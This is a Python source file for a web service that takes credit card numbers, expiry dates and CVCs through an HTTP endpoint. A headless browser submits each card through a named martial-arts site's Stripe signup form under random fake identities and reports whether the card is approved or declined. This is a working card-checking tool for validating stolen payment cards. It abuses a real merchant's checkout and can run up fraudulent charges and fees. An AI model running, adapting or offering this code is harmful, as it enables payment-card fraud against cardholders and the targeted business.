import base64
import io
from time import time
from requests import Response
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
import string
import random
import logging
from aiohttp.web import RouteTableDef, json_response
from aiohttp.web import Application, run_app, Response
from selenium import webdriver

routes = RouteTableDef()

stream = io.BytesIO()

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--log-level=3")

browser = webdriver.Chrome(options=chrome_options)


async def pay(cc, exp_mo, exp_yr, cvc):
    browser.delete_all_cookies()
    browser.get("https://martialartsolympia.com/virtual-classes-signup")
    wait = WebDriverWait(browser, 10)
    wait.until(EC.element_to_be_clickable(
        (By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[1]")))
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[1]").send_keys(gen_random_name())
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[2]").send_keys(gen_random_name() + "@gmail.com")
    password = gen_random_name()
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div/div[1]/input[1]").send_keys(password)
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div/div[1]/input[2]").send_keys(password)
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[2]/input").send_keys(gen_random_us_phone())
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[4]/section/div[2]/label[2]").click()
    browser.switch_to.frame(browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[4]/section/div[2]/label[2]/div/label/div/div/iframe"))
    browser.find_element(By.NAME, "cardnumber").send_keys(cc)
    browser.find_element(By.NAME, "exp-date").send_keys(exp_mo + "/" + exp_yr)
    browser.find_element(By.NAME, "cvc").send_keys(cvc)
    browser.switch_to.default_content()
    wait.until(EC.element_to_be_clickable((
        By.NAME, "field0")
    ))
    browser.find_element(
        By.NAME, "field0").send_keys(gen_random_name())
    browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/a[2]").click()
    try:
        wait.until(EC.element_to_be_clickable((
            By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/div")
        ))
        box = browser.find_element(
            By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/div")
        if box.text == "Success!":
            return "Success!", "N/A", "N/A"
        if "." in box.text[:len(box.text) - 1]:
            return "declined", box.text[:box.text.find(".")], box.text[box.text.find(".") + 1:].strip()
        return "declined", box.text, "N/A"
    except NoSuchElementException:
        browser.set_window_size(1920, 1080)
        screenshot = browser.get_screenshot_as_base64()
        with io.BytesIO(base64.b64decode(screenshot)) as file:
            file.seek(0)
            stream.flush()
            stream.write(file.read())
        return "error", "N/A", "N/A"


@routes.get("/screenshot")
async def serve_image(request):
    if stream.tell() == 0:
        return Response(text="No screenshot available")
    return Response(stream, content_type="image/png")


def gen_random_us_phone():
    '''
    Generate a random US phone number.
    '''
    return "".join(random.choice(string.digits) for i in range(10))


def gen_random_name():
    '''
    Generate a random name.
    '''
    return "".join(random.choice(string.ascii_lowercase) for i in range(10))


@routes.post("/stripe")
@routes.get("/stripe")
async def stripe(request):
    try:
        cc = request.rel_url.query["cc"]
    except KeyError:
        return json_response({"error": "No credit card provided."})
    try:
        cc, exp_mo, exp_yr, cvc = cc.split("|") if "|" in cc else cc.split("-")
    except (ValueError, IndexError, TypeError):
        return json_response({"error": "Invalid credit card number."})
    if not cc or not exp_mo or not exp_yr or not cvc:
        return json_response({"error": "Invalid credit card provided."})
    print("[*] Stripe payment received.")
    current_time = time()
    stat, dcode, message = await pay(cc, exp_mo, exp_yr, cvc)
    return json_response({"status": stat, "dcode": dcode, "message": message, "time": time() - current_time})

PORT = int(os.environ.get("PORT", 80))
app = Application()
app.add_routes(routes)
logging.info("starting server on port {}".format(PORT))
run_app(app, port=PORT)
